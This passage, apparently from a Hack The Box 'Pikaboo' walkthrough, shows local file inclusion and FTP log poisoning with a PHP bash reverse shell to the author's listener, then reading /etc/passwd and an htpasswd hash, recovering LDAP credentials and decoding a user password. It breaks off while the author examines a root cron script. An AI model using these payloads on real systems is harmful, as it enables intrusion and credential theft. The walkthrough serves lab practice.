</pre></td><td class="rouge-code"><pre>http://10.129.142.104/admin../admin_staging/index.php?page<span class="o">=</span>user.php
</pre></td></tr></tbody></table></code></div></div>

<p>We have an include page in the main page of the website. Can we include any page ?
First thing to try out is pull user.php from current directory as it already exists</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://10.129.142.104/admin../admin_staging/index.php?page<span class="o">=</span>./user.php
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719193525.png" alt="[Pasted image 20210719193525.png]" /></p>

<p>We have same response from the website. So this confirms we can include any file with proper permissions on our page and it executes the php page while displaying.</p>

<p>We had vsftp running on the box on port 21, and generally the logs are stored in /var/log/ directory unless specially mentioned in the configuration file.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719194750.png" alt="[Pasted image 20210719194750.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719201220.png" alt="[Pasted image 20210719201220.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>index.php?<span class="o">=</span>page/var/log/vsftpd.log
Thu Jul  8 17:17:47 2021 <span class="o">[</span>pid 14106] FTP response: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"220 (vsFTPd 3.0.3)"</span>
Thu Jul  8 17:17:49 2021 <span class="o">[</span>pid 14106] FTP <span class="nb">command</span>: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"USER anonymous"</span>
Thu Jul  8 17:17:49 2021 <span class="o">[</span>pid 14106] <span class="o">[</span>anonymous] FTP response: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"331 Please specify the password."</span>
Thu Jul  8 17:17:49 2021 <span class="o">[</span>pid 14106] <span class="o">[</span>anonymous] FTP <span class="nb">command</span>: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"PASS &lt;password&gt;"</span>
Thu Jul  8 17:17:49 2021 <span class="o">[</span>pid 14105] <span class="o">[</span>anonymous] FAIL LOGIN: Client <span class="s2">"::ffff:10.10.14.6"</span>
Thu Jul  8 17:17:50 2021 <span class="o">[</span>pid 14106] <span class="o">[</span>anonymous] FTP response: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"530 Login incorrect."</span>
Thu Jul  8 17:17:50 2021 <span class="o">[</span>pid 14106] FTP <span class="nb">command</span>: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"SYST"</span>
Thu Jul  8 17:17:50 2021 <span class="o">[</span>pid 14106] FTP response: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"530 Please login with USER and PASS."</span>
Thu Jul  8 17:18:25 2021 <span class="o">[</span>pid 14106] FTP <span class="nb">command</span>: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"QUIT"</span>
.....
stripped content
.....
</pre></td></tr></tbody></table></code></div></div>

<p>So we can include <code class="language-plaintext highlighter-rouge">/var/log/vsftpd.log</code> in our page.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Thu Jul  8 17:30:42 2021 <span class="o">[</span>pid 21009] FTP <span class="nb">command</span>: Client <span class="s2">"::ffff:10.10.14.6"</span>, <span class="s2">"USER pwnmeow"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After looking at some of the records, vsftpd logs with which username the user tried to login. It’s interesting so we have send any user and it gets loaded on the php page.</p>

<h3 id="foothold">FootHold</h3>

<p>The interesting part begins, let’s send a php reverse shell command as input and reload the page to execute and see if we get any reverse shell</p>

<p>Payload:</p>
<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;?php exec("/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.132/4444 0&gt;&amp;1'"); ?&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>10.10.14.132 is my IP and I am listening on Port 4444</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo# nc <span class="nt">-lvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s send the above mentioned payload as username in ftp</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo# ftp pikaboo
Connected to pikaboo.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>pikaboo:root<span class="o">)</span>: &lt;?php <span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.132/4444 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt; 
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>And reload the page</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719195738.png" alt="[Pasted image 20210719195738.png]" /></p>

<p>And we are on the machine. Reverse shell worked!!!</p>

<p>Let’s execute and increase the control over the reverse shell as bare reverse shell does have many features.</p>

<p>Loading bash</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.</p>

<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>stty raw -echo
</pre></td></tr></tbody></table></code></div></div>

<p>Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.</p>

<p>Set Terminal environment</p>
<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>export TERM=xterm
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to see which users exists on the box.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/var/www/html/admin_staging<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
openldap:x:105:112:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nslcd:x:107:113:nslcd name service LDAP connection daemon,,,:/var/run/nslcd/:/usr/sbin/nologin
ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
redis:x:109:116::/var/lib/redis:/usr/sbin/nologin
postgres:x:110:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</pre></td></tr></tbody></table></code></div></div>

<p>We have one user : pwnmeow</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash
</pre></td></tr></tbody></table></code></div></div>
<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719200637.png" alt="[Pasted image 20210719200637.png]" /></p>

<p>We got the user flag. Now its time to escalate and gain full control over machine.</p>

<p>Let’s have a look how the webserver is configured both nginx and apache.</p>

<ul>
  <li>Nginx conf file
    <div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>server <span class="o">{</span>                                                                                                                                                             
      listen 80 default_server<span class="p">;</span>                                                                                                        
      listen <span class="o">[</span>::]:80 default_server<span class="p">;</span>                                             
      server_name _<span class="p">;</span>

      location / <span class="o">{</span>
              <span class="c"># First attempt to serve request as file, then</span>
              <span class="c"># as directory, then fall back to displaying a 404.</span>
              proxy_pass http://127.0.0.1:81/pokatdex/<span class="p">;</span>
      <span class="o">}</span>

      location /admin <span class="o">{</span>
              proxy_pass http://127.0.0.1:81/admin/<span class="p">;</span>
      <span class="o">}</span>

      location /artwork/ <span class="o">{</span>

      location /artwork/ <span class="o">{</span>
              root /opt/pokeapi/data/v2/sprites/<span class="p">;</span>
      <span class="o">}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Apache conf file
```bash
www-data@pikaboo:/etc/nginx/sites-enabled$ cat /etc/apache2/sites-enabled/000-default.conf</li>
</ul>
<p>&lt;VirtualHost 127.0.0.1:81&gt;
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request’s Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com</p>

<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
    # error, crit, alert, emerg.
    # It is also possible to configure the loglevel for particular
    # modules, e.g.
    #LogLevel info ssl:warn

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    # For most configuration files from conf-available/, which are
    # enabled or disabled at a global level, it is possible to
    # include a line for only one particular virtual host. For example the
    # following line enables the CGI configuration for this host only
    # after it has been globally disabled with "a2disconf".
    #Include conf-available/serve-cgi-bin.conf
    &lt;Directory "/var/www/html/admin"&gt; 
            AuthType Basic
            AuthName "Authentication Required"
            AuthUserFile "/etc/apache2/htpasswd"
            Require valid-user
            Order allow,deny
            Allow from all
    &lt;/Directory&gt;
</pre></td></tr></tbody></table></code></div></div>
<p>&lt;/VirtualHost&gt;</p>

<h1 id="vim-syntaxapache-ts4-sw4-sts4-sr-noet">vim: syntax=apache ts=4 sw=4 sts=4 sr noet</h1>
<p>www-data@pikaboo:/etc/nginx/sites-enabled$</p>
<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>
We have htpasswd which was configured for admin page. Let's grab it and see the contents of it. 

```bash
www-data@pikaboo:/etc/nginx/sites-enabled$ cat /etc/apache2/htpasswd
admin:$apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.
</pre></td></tr></tbody></table></code></div></div>

<p>I tired cracking with hashcat but could crack it. May be it was a random password.</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span> hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 1600 hash.txt /opt/rockyou.txt <span class="nt">--force</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I ran some auto configuration checks on the machine using our linux enumeration script.</p>

<p>Run a simple python server on our machine and download the files on the remote machine as we dont have ssh or ftp credentials to transfer files.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719201057.png" alt="[Pasted image 20210719201057.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719201252.png" alt="[Pasted image 20210719201252.png]" /></p>

<p>Let’s run the linpeas.sh module and check if we have any useful information</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719201524.png" alt="[Pasted image 20210719201524.png]" /></p>

<p>We have an active port other than 21,22,80, 81 -&gt; 389 (LDAP)</p>

<p>Tried logging in with empty creds, ldap is bind is disabled with anonymous account which is a good way to implement.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 127.0.0.1 <span class="nt">-D</span> <span class="s1">''</span> w <span class="s1">''</span> <span class="nt">-b</span> <span class="s2">"dc=pikaboo,dc=htb"</span>
ldap_bind: Inappropriate authentication <span class="o">(</span>48<span class="o">)</span>
        additional info: anonymous <span class="nb">bind </span>disallowed
www-data@pikaboo:/opt/pokeapi<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>After searching through the box found an interesting directory about api development and it has a config directory</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719205419.png" alt="[Pasted image 20210719205419.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719205841.png" alt="[Pasted image 20210719205841.png]" /></p>

<p>in config directory we have some ldap credentials</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nb">cat</span> /opt/pokeapi/config/settings.py
...

    <span class="s2">"ldap"</span>: <span class="o">{</span>
        <span class="s2">"ENGINE"</span>: <span class="s2">"ldapdb.backends.ldap"</span>, 
        <span class="s2">"NAME"</span>: <span class="s2">"ldap:///"</span>,
        <span class="s2">"USER"</span>: <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span>,
        <span class="s2">"PASSWORD"</span>: <span class="s2">"J~42%W?PFHl]g"</span>,
    <span class="o">}</span>

...
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s dump all the information from ldap using the binduser</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td><td class="rouge-code"><pre>
www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 127.0.0.1 <span class="nt">-D</span> <span class="s1">'cn=binduser,ou=users,dc=pikaboo,dc=htb'</span> <span class="nt">-w</span> <span class="s1">'J~42%W?PFHl]g'</span> <span class="nt">-b</span> <span class="s2">"dc=pikaboo,dc=htb"</span>                
<span class="c"># extended LDIF                          </span>
<span class="c">#              </span>
<span class="c"># LDAPv3                                 </span>
<span class="c"># base &lt;dc=pikaboo,dc=htb&gt; with scope subtree                                      </span>
<span class="c"># filter: (objectclass=*)                                                          </span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

<span class="c"># pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: pikaboo

<span class="c"># ftp.pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: ftp

<span class="c"># users, pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># pokeapi.pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: pokeapi

<span class="c"># users, ftp.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># pwnmeow, users, ftp.pikaboo.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>pwnmeow,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: <span class="nv">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw</span><span class="o">==</span>

<span class="c"># binduser, users, pikaboo.htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>binduser,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: <span class="nv">Sn40MiVXP1BGSGxdZw</span><span class="o">==</span>

<span class="c"># users, pokeapi.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># groups, pokeapi.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">groups</span>,dc<span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">groups</span>

</pre></td></tr></tbody></table></code></div></div>

<p>We have user creds for <code class="language-plaintext highlighter-rouge">pwnmeow</code> user.</p>

<p>userPassword : <code class="language-plaintext highlighter-rouge">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==</code> looks like a base64 encode.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"X0cwdFQ0X0M0dGNIXyczbV80bEwhXw=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
_G0tT4_C4tcH_<span class="s1">'3m_4lL!_
</span></pre></td></tr></tbody></table></code></div></div>

<p>Now we have user and a password</p>

<p>user: <code class="language-plaintext highlighter-rouge">pwnmeow</code>
pass: <code class="language-plaintext highlighter-rouge">_G0tT4_C4tcH_'3m_4lL!_</code></p>

<p>Tried to login with ssh using the credentials but the authentication failed.</p>

<h3 id="privilege-escalation">Privilege Escalation</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /etc/nsswitch.conf 
<span class="c"># /etc/nsswitch.conf</span>
<span class="c">#</span>
<span class="c"># Example configuration of GNU Name Service Switch functionality.</span>
<span class="c"># If you have the `glibc-doc-reference' and `info' packages installed, try:</span>
<span class="c"># `info libc "Name Service Switch"' for information about this file.</span>

passwd:         files systemd <span class="c">#ldap</span>
group:          files systemd <span class="c">#ldap</span>
shadow:         files <span class="c">#ldap</span>
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
</pre></td></tr></tbody></table></code></div></div>

<p>ldap authentication is disabled for login in nsswitch.conf</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719210654.png" alt="[Pasted image 20210719210654.png]" /></p>

<p>Pwnmeow user has group of ftp, so he has access to ftp login. Let’s try and check.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719210819.png" alt="[Pasted image 20210719210819.png]" /></p>

<p>Yes, we could login as pwnmeow user but gaining a shell as a user was not possible.</p>

<p>Then our automated script also showed us there is a cronjob configured.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab <span class="p">;</span>
<span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /usr/local/bin/csvupdate_cron
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s see what the script does</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/csvupdate_cron
<span class="c">#!/bin/bash</span>

<span class="k">for </span>d <span class="k">in</span> /srv/ftp/<span class="k">*</span>
<span class="k">do
  </span><span class="nb">cd</span> <span class="nv">$d</span>
  /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
  /usr/bin/rm <span class="nt">-rf</span> <span class="k">*</span>
<span class="k">done
</span>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>

<p>This line caught my attention <code class="language-plaintext highlighter-rouge">$d</code> can be used as a potential vector</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>  /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
</pre></td></tr></tbody></table></code></div></div>

<p>As linux execute $() command before running the line</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>root@kali:~# <span class="nv">d</span><span class="o">=</span><span class="nb">whoami
</span>root@kali:~# <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span>
root
root@kali:~# 
</pre></td></tr></tbody></table></code></div></div>

<p>Tried to exploit with this, but it did not work in this case.</p>

<p>Nothing much in it but we have another script being called in the program</p>

<div lang="perl" class="language-perl highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre><span class="nv">www</span><span class="o">-</span><span class="nv">data@pikaboo:</span><span class="sr">/opt/po</span><span class="nv">keapi</span><span class="sr">/config$ cat /us</span><span class="nv">r</span><span class="sr">/local/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">csvupdate</span>                                                                                                   
<span class="c1">#!/usr/bin/perl                                                                      </span>
<span class="c1">##################################################################                                                                                                    </span>
<span class="c1"># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #                 </span>
<span class="c1">#                                                                #                 </span>
<span class="c1"># Usage:                                                         #                 </span>
<span class="c1"># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #                 </span>
<span class="c1">#                                                                #                 </span>
<span class="c1"># Arguments:                                                     #                 </span>
<span class="c1"># - type: PokeAPI CSV file type                                  #                 </span>
<span class="c1">#         (must have the correct number of fields)               #                 </span>
<span class="c1"># - file(s): list of files containing CSV data                   #                 </span>
<span class="c1">##################################################################                 </span>
                                                                                   
<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>                                                                        
<span class="k">use</span> <span class="nv">warnings</span><span class="p">;</span>                                                                      
<span class="k">use</span> <span class="nn">Text::</span><span class="nv">CSV</span><span class="p">;</span>                                                                     
                                         
<span class="k">my</span> <span class="nv">$csv_dir</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/opt/pokeapi/data/v2/csv</span><span class="p">";</span>                                          
                                                                                   
<span class="k">my</span> <span class="nv">%csv_fields</span> <span class="o">=</span> <span class="p">(</span>                                                                 
  <span class="p">'</span><span class="s1">abilities</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>                                                                                <span class="p">''""</span>
<span class="o">----</span><span class="nv">TRIMMED</span> <span class="nv">CODE</span> <span class="o">----</span>

  <span class="p">"""</span><span class="s2">''     
  'version_group_pokemon_move_methods' =&gt; 2,                                                                                                                          
  'version_group_regions' =&gt; 2,                                                                                                                                       
  'version_groups' =&gt; 4,                                                                                                                                              
  'version_names' =&gt; 3,                                                            
  'versions' =&gt; 3                                                                  
);                                                                                 
                                                                                   
                                                                                   
if($#ARGV &lt; 1)                                                                                                                                                        
{                                                                                  
  die </span><span class="p">"</span><span class="nv">Usage:</span> <span class="err">$</span><span class="mi">0</span> <span class="o">&lt;</span><span class="nv">type</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nv">file</span><span class="p">(</span><span class="sr">s)&gt;\n";                                              
}                                                                                  
                                                                                   
my $type = $ARGV[0];                                                               
if(!exists $csv_fields{$type})                                                     
{                                                                                  
  die "Unrecognised CSV data type: $type.\n";                                      
}                                                                                  
                                                                                   
my $csv = Text::CSV-&gt;new({ sep_char =&gt; ',' })</span><span class="p">;</span>                                     
                                                                                   
<span class="k">my</span> <span class="nv">$fname</span> <span class="o">=</span> <span class="p">"</span><span class="si">${csv_dir}</span><span class="s2">/</span><span class="si">${type}</span><span class="s2">.csv</span><span class="p">";</span>                                              
